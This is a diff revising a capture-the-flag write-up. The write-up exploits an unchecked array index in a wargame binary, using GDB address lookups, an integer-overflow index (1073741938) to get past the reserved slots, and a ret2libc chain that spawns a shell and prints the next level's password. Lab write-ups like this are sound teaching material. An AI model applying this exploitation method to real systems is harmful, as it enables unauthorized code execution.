@@ -39,16 +39,16 @@ Input command: read
  Index: 2
  Number at data[2] is 4294967295
 ```
-The program allow us to store unsigned number in an array and read them.
+The program allows us to store numbers in an array and display them.
 
-Decompiling with Hex-Rays on https://dogbolt.org/ show us that:
-- the array is 400 bytes long, but is casted in DWORD when used and the index asked to the user is multiplied by 4, so we can conclude that it is used an unsigned int array of 100 elements
-- the index provided by the user is use without checking if it is bigger than the size of the array.
-- the program has reserved all index that are multiple of 3 and refused to store number whose the high bytes are equal to 183.
+Decompiling with Hex-Rays on https://dogbolt.org/ shows us that:
+- there is an array of unsigned int of 100 elements
+- the index provided by the user is used without checking if it exceeds the size of the array
+- you cannot store numbers at any index that is a multiple of 3. 
 
-We can't do a format string attack nor a buffer overflow, so our only way to exploit the binary is to use the `store` command to store value on the stack. The index vulnerability allow us to store value outside the array, in a similar way to a buffer overflow.
+We can't do a format string attack nor a buffer overflow, so our only way to exploit the binary is to use the `store` command to write on the stack. The vulnerability lies in the fact that you can store values outside the array. Our goal is to do a `ret2libc` attack by finding `EIP` and overwrite it with `system()`.
 
-We will first retrieve `system()`, `exit()` and `/bin/sh` address using GDB:
+We will first retrieve the addresses of `system()`, `exit()` and `/bin/sh`:
 ```Shell
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
@@ -58,14 +58,14 @@ $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 0xf7f897ec
 ```
 
-The array store unsigned int value so if we want to store this address we need to convert them in decimal:
+Since the program only deals with decimal numbers, we must convert the addresses from hexa to decimal:
 ```
 system: 0xf7e6aed0 -> 4159090384
 exit: 0xf7e5eb70 -> 4159040368
 /bin/sh: 0xf7f897ec -> 4160264172
 ```
 
-To know wich index to use to 'overflow' our array we need to find the offset beetween `EIP` and the begining of our array:
+Now, we need to know at which index we should store the address of `system()`. Using `gdb-peda`, we found the offset between `EIP` and the beginning of our array by placing a breakpoint right after the call to `read()` and inspect the values:
 ```Shell
 Guessed arguments:
 arg[0]: 0xffffcdf4 --> 0x0 
@@ -77,20 +77,21 @@ gdb-peda$ i f
   eip at 0xffffcfbc
 ```
 
-We can see the address of the first element in the array (0xffffcdf4) and the address of eip (0xffffcfbc), a substraction give us an offset of 456 bytes (0xffffcfbc - 0xffffcdf4).
-This is an array of int so each element has a size of 4 bytes, so the offset in term of index is 114 (456 / 4).
-
-Let's try to change EIP by '0xaaaaaaaa' (2863311530 in decimal):
+`0xffffcdf4` is the address of the start of the array. `0xffffcfbc` is the address of `EIP`. Subtracting the address of the array from `EIP` give us an offset of 456 bytes (0xffffcfbc - 0xffffcdf4).
+This is an array of `int` so each element has a size of 4 bytes. If we do 456 / 4, we get `114`, which corresponds to the index we must access. 
+First, let's run a check to see if we have the correct value:
 ```Shell
 Input command: store
- Number: 2863311530
+ Number: 258
  Index: 114
  *** ERROR! ***
    This index is reserved for wil!
  *** ERROR! ***
  Failed to do store command
  ```
-We can't use the 114th index because it's a multiple of 3, but since the index is stored in an unsigned int, overflowing it should allow us to store the value at index 114. The provided index is multiplied by 4, so using `MAX_UINT_32 / 4` and adding 114 (1073741938) is equivalent to using 114 as index.
+We can't use the 114th index because it's a multiple of 3. But perhaps overflowing it could allow us to reach 114 anyway. The program multiplies the index by 4, so if we use `MAX_UINT_32 / 4` and add 114, we get `1073741938`, which is the same as 114.
+
+Now, for testing purposes, let's try to change `EIP` by '0xaaaaaaaa' (2863311530 in decimal):
 ```Shell
 Input command: store
  Number: 2863311530
@@ -105,25 +106,24 @@ Input command: quit
 Program received signal SIGSEGV, Segmentation fault.
 0xaaaaaaaa in ?? ()
 ```
+It seems to work!
+Therefore storing `system()`, `exit()` and `/bin/sh` addresses at indices 114, 115, 116 should open a terminal.
 
-So storing `system()`, `exit()` and `/bin/sh` address at the index 114, 115, 116 should open a terminal.
-
+Here is the result:
 ```Shell
 Input command: store
- Number: 4159090384
- Index: 1073741938
- Completed store command successfully
+ Number: 4159090384                           // system()
+ Index: 1073741938                            // index 114
+ Completed store command successfully         
 Input command: store
- Number: 4159040368
+ Number: 4159040368                           // exit()
  Index: 115
- Completed store command successfully
+ Completed store command successfully           
 Input command: store
- Number: 4160264172
+ Number: 4160264172                           // /bin/sh
  Index: 116
  Completed store command successfully
 Input command: quit
-$ cat /home/users/level07/.pass
-cat: /home/users/level07/.pass: Permission denied
 $ cat /home/users/level08/.pass
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
 ```
